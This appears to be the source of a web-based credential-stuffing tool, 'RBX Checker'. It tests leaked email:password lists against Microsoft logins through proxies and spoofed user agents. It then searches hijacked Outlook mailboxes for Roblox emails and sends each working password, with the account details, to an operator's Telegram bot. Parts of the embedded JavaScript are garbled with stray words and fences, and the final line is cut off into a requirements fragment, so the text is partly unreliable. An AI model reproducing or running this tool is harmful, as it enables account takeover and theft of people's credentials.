import os
import re
import json
import time
import uuid
import threading
from queue import Queue, Empty

import requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
from user_agent import generate_user_agent

app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

STATE = {
    "running": False,
    "stats": {"hits": 0, "bad": 0, "custom": 0, "white": 0, "total": 0, "processed": 0},
    "workers": 20,
    "bot_token": "",
    "chat_id": "",
    "proxies": [],
    "logs": [],
}
LOCK = threading.Lock()
STOP_FLAG = threading.Event()


def log(line: str):
    entry = f"[{time.strftime('%H:%M:%S')}] {line}"
    with LOCK:
        STATE["logs"].append(entry)
        if len(STATE["logs"]) > 500:
            STATE["logs"] = STATE["logs"][-500:]
    socketio.emit("log", {"line": entry})
    socketio.emit("stats", STATE["stats"])


def send_telegram(email, password, username, friends, banned, created, profile, wearing):
    token, chat = STATE["bot_token"], STATE["chat_id"]
    if not token or not chat:
        return
    try:
        wearing_str = ", ".join(wearing[:5]) if wearing else "None"
        msg = (
            f"✅ ROBLOX HIT!\n"
            f"📧 {email}\n🔑 {password}\n👤 {username}\n"
            f"👥 Friends: {friends}\n🚫 Banned: {banned}\n"
            f"📅 Created: {created}\n🔗 {profile}\n"
            f"👕 Wearing: {wearing_str}"
        )
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat, "text": msg},
            timeout=5,
        )
    except Exception:
        pass


def get_user_id(username):
    try:
        r = requests.post(
            "https://users.roblox.com/v1/usernames/users",
            json={"usernames": [username], "excludeBannedUsers": False},
            timeout=10,
        )
        if r.status_code == 200 and r.json().get("data"):
            return r.json()["data"][0]["id"]
    except Exception:
        pass
    return None


def get_csrf():
    s = requests.Session()
    try:
        r = s.post(
            "https://catalog.roblox.com/v1/catalog/items/details",
            json={"items": []},
            timeout=10,
        )
        return r.headers.get("x-csrf-token"), s
    except Exception:
        return None, None


def get_asset_names(asset_ids):
    if not asset_ids:
        return []
    token, session = get_csrf()
    if not token:
        return []
    try:
        items = [{"itemType": "Asset", "id": int(a)} for a in asset_ids]
        r = session.post(
            "https://catalog.roblox.com/v1/catalog/items/details",
            json={"items": items},
            headers={"x-csrf-token": token},
            timeout=10,
        )
        if r.status_code == 200:
            return [i.get("name", "Unknown") for i in r.json().get("data", [])]
    except Exception:
        pass
    return []


def get_roblox_data(username, proxies=None):
    uid = get_user_id(username)
    if not uid:
        return None
    try:
        user = requests.get(
            f"https://users.roblox.com/v1/users/{uid}",
            timeout=10,
            proxies=proxies,
        ).json()
        friends = requests.get(
            f"https://friends.roblox.com/v1/users/{uid}/friends/count",
            timeout=10,
            proxies=proxies,
        ).json()
        wearing = requests.get(
            f"https://avatar.roblox.com/v1/users/{uid}/currently-wearing",
            timeout=10,
            proxies=proxies,
        ).json()
        names = get_asset_names(wearing.get("assetIds", []))
        return {
            "username": username,
            "friends": friends.get("count", 0),
            "banned": "Yes" if user.get("isBanned", False) else "No",
            "created": (user.get("created") or "").split("T")[0] or "Unknown",
            "profile": f"https://www.roblox.com/users/{uid}/profile",
            "wearing": names,
        }
    except Exception:
        return None


def extract_roblox_user(text):
    patterns = [
        r"account:\s*([a-zA-Z0-9_]+)",
        r"for\s+([a-zA-Z0-9_]+)\s+and",
        r"for\s+([a-zA-Z0-9_]+)\.",
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(1)
    return None


def check_hotmail(email, password, proxies=None):
    s = requests.Session()
    if proxies:
        s.proxies = proxies
    try:
        url = (
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            f"?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code"
            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )
        r = s.get(url, headers={"User-Agent": generate_user_agent()}, allow_redirects=True)
        ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', r.text)
        if not ppft:
            return None
        urlpost = re.search(r'"urlPost":"([^"]+)"', r.text)
        if not urlpost:
            return None
        data = (
            f"login={email}&loginfmt={email}&passwd={password}"
            f"&PPFT={ppft.group(1)}&PPSX=Passport&NewUser=1"
        )
        post = s.post(
            urlpost.group(1),
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=False,
        )
        if "__Host-MSAAUTHP" not in s.cookies.get_dict():
            return None
        code = None
        loc = post.headers.get("Location", "")
        if "code=" in loc:
            code = loc.split("code=")[1].split("&")[0]
        if not code:
            return None
        tok = requests.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data={
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
            },
            timeout=30,
            proxies=proxies,
        )
        if tok.status_code != 200:
            return None
        at = tok.json().get("access_token")
        if not at:
            return None
        cid = s.cookies.get("MSPCID", "").upper()
        if not cid:
            return None
        search = requests.post(
            "https://outlook.live.com/search/api/v2/query",
            json={
                "EntityRequests": [
                    {
                        "EntityType": "Conversation",
                        "Query": {"QueryString": "no-reply@roblox.com"},
                        "Size": 25,
                    }
                ]
            },
            headers={"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}"},
            timeout=30,
            proxies=proxies,
        )
        if search.status_code != 200:
            return None
        uname = extract_roblox_user(search.text)
        if not uname:
            return None
        rb = get_roblox_data(uname, proxies)
        if not rb:
            return None
        return {"email": email, "password": password, "roblox": rb}
    except Exception:
        return None


def parse_proxy(p):
    if not p:
        return None
    try:
        if "@" in p:
            cred, ipport = p.split("@", 1)
            u, pw = cred.split(":", 1)
            ip, port = ipport.split(":", 1)
            url = f"http://{u}:{pw}@{ip}:{port}"
        else:
            ip, port = p.split(":", 1)
            url = f"http://{ip}:{port}"
        return {"http": url, "https": url}
    except Exception:
        return None


def worker(combo_queue, proxy_queue):
    while not STOP_FLAG.is_set():
        try:
            combo = combo_queue.get_nowait()
        except Empty:
            return
        with LOCK:
            STATE["stats"]["processed"] += 1
        try:
            email, password = combo.split(":", 1)
        except ValueError:
            combo_queue.task_done()
            continue
        proxies = None
        if not proxy_queue.empty():
            try:
                proxies = parse_proxy(proxy_queue.get_nowait())
                proxy_queue.put("")
            except Empty:
                proxies = None
        result = check_hotmail(email, password, proxies)
        with LOCK:
            if result:
                STATE["stats"]["hits"] += 1
            else:
                STATE["stats"]["bad"] += 1
        if result:
            rb = result["roblox"]
            log(f"HIT → {email} | {rb['username']}")
            send_telegram(
                result["email"], result["password"], rb["username"],
                rb["friends"], rb["banned"], rb["created"],
                rb["profile"], rb["wearing"],
            )
        else:
            log(f"BAD → {email}")
        socketio.emit("stats", STATE["stats"])
        combo_queue.task_done()


def run_checker(combos, proxies, workers):
    with LOCK:
        STATE["stats"] = {"hits": 0, "bad": 0, "custom": 0, "white": 0,
                          "total": len(combos), "processed": 0}
    STATE["running"] = True
    STOP_FLAG.clear()
    combo_q, proxy_q = Queue(), Queue()
    for c in combos:
        combo_q.put(c)
    for p in proxies:
        proxy_q.put(p)
    log(f"Starting {workers} workers | {len(combos)} combos | {len(proxies)} proxies")
    threads = []
    for _ in range(min(workers, max(1, len(combos)))):
        t = threading.Thread(target=worker, args=(combo_q, proxy_q), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    STATE["running"] = False
    log(f"Done. Hits: {STATE['stats']['hits']} | Bad: {STATE['stats']['bad']}")


INDEX_HTML = r"""<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RBX Checker — Terminal</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
  :root { --bg:#0a0e0a; --fg:#39ff14; --dim:#1a3a1a; --err:#ff3b3b; --hit:#39ff14; }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--bg); color:var(--fg); font-family:"Courier New",monospace; }
  .wrap { max-width:1100px; margin:0 auto; padding:16px; }
  h1 { font-size:16px; margin:0 0 8px; letter-spacing:2px; }
  .row { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:10px; }
  input,button,textarea,select {
    background:#000; color:var(--fg); border:1px solid var(--fg);
    font-family:inherit; padding:6px 8px; font-size:13px;
  }
  input,textarea,select { flex:1; min-width:120px; }
  textarea { min-height:80px; resize:vertical; }
  button { cursor:pointer; }
  button:hover { background:var(--fg); color:#000; }
  .term {
    background:#000; border:1px solid var(--dim); padding:10px;
    height:360px; overflow-y:auto; font-size:13px; line-height:1.5;
    white-space:pre-wrap; word-break:break-all;
  }
  .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:8px; margin:10px 0; }
  .stat { border:1px solid var(--dim); padding:8px; text-align:center; }
  .stat b { display:block; font-size:18px; }
  .hit { color:var(--hit); }
  .bad { color:#ff8888; }
  .muted { color:#5a7a5a; font-size:11px; }
  .bar { height:6px; background:var(--dim); margin:6px 0; }
  .bar>div { height:100%; background:var(--fg); width:0%; transition:width .3s; }
</style>
</head>
<body>
<div class="wrap">
  <h1>▶ RBX CHECKER — TERMINAL LIVE</h1>

  <div class="row">
    <input id="bot" placeholder="Bot Token">
    <input id="chat" placeholder="Chat ID">
  </div>

  <div class="row">
    <select id="mode">
      <option value="proxyless">Proxyless</option>
      <option value="proxy">Proxy</option>
    </select>
    <input id="workers" type="number" value="20" min="1" max="200" placeholder="Workers">
  </div>

  <div class="row">
    <textarea id="combos" placeholder="email:pass&#10;email:pass&#10;..."></textarea>
  </div>

  <div class="row">
    <textarea id="proxies" placeholder="proxy:port atau user:pass@ip:port (سطر لكل بروكسي)"></textarea>
  </div>

  <div class="row">
    <button id="start">▶ START</button>
    <button id="stop">■ STOP</button>
    <button id="clear">CLEAR</button>
  </div>

  <div class="stats">
    <div class="stat">Total <b id="s-total">0</b></div>
    <div class="stat">Processed <b id="s-proc">0</b></div>
    <div class="stat hit">Hits <b id="s-hits">0</b></div>
    <div class="stat bad">Bad <b id="s-bad">0</b></div>
    <div class="stat">Retries <b id="s-white">0</b></div>
    <div class="stat">Custom <b id="s-custom">0</b></div>
  </div>
  <div class="bar"><div id="bar"></div></div>
  <div class="muted" id="status">Idle</div>

  <div class="term" id="term"></div>
</div>

<script>
const socket = io();
const term = document.getElementById("term");

function append(cls, text) {
  constwerk div = document.createElement("div");
  div.className = clszeug;
  div.textContent=True = text;
  term.appendChild(div);
)
  term.scrollTop = term.scrollHeight```

;
}

socket.on("log", d => {
  const---

 cls = d.line.includes("HIT") ? "hit" : d.line.includes("BAD") ? "bad" : "";
  append(cls, d.line);
});

socket.on("stats", s => {
  document.getElementById("s-total").textContent = s.total;
  document.getElementById("s-proc").textContent = s.processed;
  document.getElementById("s-hits").textContent = s.hits;
  document.getElementById("s-bad").textContent = s.bad;
  document.getElementById("s-white").textContent = s.white;
  document.getElementById("s-custom").textContent = s.custom;
  const pct = s.total ? Math.floor(s.processed * 100 / s.total) : 0;
  document.getElementById("bar").style.width = pct + "%";
  document.getElementById("status").textContent =
    s.processed >= s.total && s.total > 0 ? "Done" : "Scanning...";
});

document.getElementById("start").onclick = async () => {
  const body = {
    bot_token: document.getElementById("bot").value.trim(),
    chat_id: document.getElementById("chat").value.trim(),
    workers: parseInt(document.getElementById("workers").value) || 20,
    combos: document.getElementById("combos").value.split("\n").map(x => x.trim()).filter(Boolean),
    proxies: document.getElementById("proxies").value.split("\n").map(x => x.trim()).filter(Boolean),
  };
  if (!body.combos.length) return append("bad", "!! no combos");
  append("", `> launching ${body.combos.length} combos with ${body.workers} workers`);
  const r = await fetch("/api/start", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(body)
  });
  const j = await r.json();
  append("", "> " + JSON.stringify(j));
};

document.getElementById("stop").onclick = async () => {
  await fetch("/api/stop", { method: "POST" });
  append("bad", "> stop signal sent");
};

document.getElementById("clear").onclick = () => { term.innerHTML = ""; };

append("", "> terminal ready — paste combos and press START");
</script>
</body>
</html>
"""


@app.route("/")
def index():
    return render_template_string(INDEX_HTML)


@app.route("/api/start", methods=["POST"])
def api_start():
    if STATE["running"]:
        return jsonify({"ok": False, "error": "already running"}), 400
    data = request.get_json(force=True)
    combos = data.get("combos", [])
    proxies = data.get("proxies", [])
    workers = int(data.get("workers", 20))
    STATE["bot_token"] = data.get("bot_token", "")
    STATE["chat_id"] = data.get("chat_id", "")
    threading.Thread(
        target=run_checker, args=(combos, proxies, workers), daemon=True
    ).start()
    return jsonify({"ok": True, "queued": len(combos), "workers": workers})


@app.route("/api/stop", methods=["POST"])
def api_stop():
    STOP_FLAG.set()
    return jsonify({"ok": True})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_### `requirements.txt`

```txt
flask==3.0.3
flask-socketio==5.3.6
requests==2.32.3
user-agent==0.1.0
